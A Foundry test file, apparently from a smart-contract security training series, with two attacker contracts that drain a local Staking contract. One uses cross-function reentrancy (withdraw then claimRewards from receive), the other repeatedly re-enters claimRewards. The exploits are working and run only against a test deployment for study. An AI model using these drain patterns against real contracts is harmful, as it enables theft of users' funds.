// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/Console.sol";
import {Staking} from "../../src/Week1/Day2_Cross_functional_Reentrancy.sol";

interface IStaking {
    function stake() external payable;
    function addReward(address user, uint256 amount) external payable;
    function withdraw() external;
    function claimRewards() external;
}

contract Attacker {
    IStaking public staking;
    bool public hasAttacked;

  constructor(address _stakingAddress){
    staking = IStaking(_stakingAddress);
  }

  function attack() external payable{
    staking.stake{value:msg.value}();
    staking.withdraw();
  }

  receive() external payable{
    if(!hasAttacked){
      hasAttacked = true;
      staking.claimRewards();
    }
  }
}


contract StakeTest is Test{
  Attacker public attacker;
  Staking public stake;
  function setUp() external {
    stake = new Staking();
    attacker = new Attacker(address(stake));

   
  }

  function test_exploit() external {

    vm.deal(address(stake), 50 ether);
    vm.deal(address(attacker), 10 ether);

    console.log("stake balance before attack",address(stake).balance);
    console.log("Attacker balance before attack",address(attacker).balance);

    vm.prank(address(attacker)); 
    attacker.attack{value:10 ether}();

    console.log("stake balance after attack",address(stake).balance);
    console.log("Attacker balance after attack",address(attacker).balance);
  }

  function test_exploit_two() external{
    
  }
}

contract RewardAttacker {
  IStaking public stake;
  uint256 public initialDeposit;
  uint256 public constant REWARD_PERCENT = 10;
  constructor(address _stakingAddress) {
    stake = IStaking(_stakingAddress);
  }

  function attack() external payable{
    initialDeposit = msg.value;
    stake.stake{value: msg.value}();
    stake.claimRewards();
  }

  receive() external payable{
    if(address(stake).balance > 0){
      stake.claimRewards();
    }
  }
}

contract RewardTest is Test{
  Staking public stake;
  RewardAttacker public rewardAttack;
  function setUp() external{
    stake = new Staking();
    rewardAttack = new RewardAttacker(address(stake));
  }

  function test_exploit() external{
    vm.deal(address(stake), 10 ether);
    vm.deal(address(rewardAttack), 10 ether);

    console.log("stake balance before attack",address(stake).balance);
    console.log("Attacker balance before attack",address(rewardAttack).balance);

    vm.prank(address(rewardAttack));
    rewardAttack.attack{value:10 ether}();
    
    console.log("stake balance after attack",address(stake).balance);
    console.log("Attacker balance after attack",address(rewardAttack).balance);
  }
}